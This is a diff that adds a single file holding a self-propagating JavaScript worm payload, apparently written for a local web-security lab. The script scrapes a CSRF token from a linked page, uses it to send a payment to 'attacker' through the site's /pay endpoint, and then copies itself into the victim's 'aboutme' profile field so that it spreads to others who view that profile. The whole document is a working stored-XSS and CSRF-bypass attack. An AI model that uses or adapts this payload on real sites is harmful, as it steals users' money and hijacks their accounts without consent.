@@ -1,0 +1,21 @@
+<script>
+    const currentScript = document.currentScript.innerHTML;
+    const tokenReq = new XMLHttpRequest();
+    tokenReq.addEventListener("load", () => {
+        const elem = document.createElement("div");
+        elem.innerHTML = tokenReq.responseText;
+        const token = elem.getElementsByTagName("input")[4].value;
+
+        const paymentReq = new XMLHttpRequest();
+        paymentReq.open("POST", "http://localhost:8080/pay", true);
+        paymentReq.send(`recipient=attacker&amount=1&token=${token}`);
+
+        const profileReq = new XMLHttpRequest();
+        const scriptContent = encodeURIComponent(`<script>${currentScript}<\/script>`);
+        profileReq.open("POST", "http://localhost:8080/aboutme", true);
+        profileReq.send(`aboutme=${scriptContent}`);
+    });
+
+    tokenReq.open("GET", document.getElementsByTagName("a")[0].href, true);
+    tokenReq.send();
+</script>
